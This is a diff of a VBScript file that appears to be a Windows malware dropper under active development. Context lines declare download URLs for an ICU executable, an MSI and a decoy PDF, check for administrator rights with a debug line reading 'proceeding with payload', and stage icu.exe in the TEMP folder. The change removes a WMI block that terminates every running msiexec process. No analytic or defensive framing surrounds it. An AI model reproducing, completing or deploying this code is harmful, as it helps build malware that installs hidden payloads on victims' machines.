@@ -1,7 +1,6 @@
 Dim fso, sh, qs, selfPath, isAdmin, http, stream, dbg
 Dim icuUrl, msiUrl, pdfUrl
 Dim tmpExe, msiPath, pdfPath, logFile
-Dim wmi, msiKill, msiKillEntry
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
@@ -141,21 +140,6 @@ If Not isAdmin Then
 Else
     dbg.WriteLine "[BRANCH] ADMIN - proceeding with payload"
     
-    ' --- KILL ZOMBIE MSIEXEC ---
-    dbg.WriteLine "[MSI] Killing zombie msiexec..."
-    On Error Resume Next
-    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-    If Err.Number = 0 Then
-        Set msiKill = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
-        If Err.Number = 0 Then
-            For Each msiKillEntry In msiKill
-                msiKillEntry.Terminate
-            Next
-        End If
-    End If
-    Err.Clear
-    On Error GoTo 0
-
     tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
     On Error Resume Next
     If fso.FileExists(tmpExe) Then fso.DeleteFile tmpExe, True
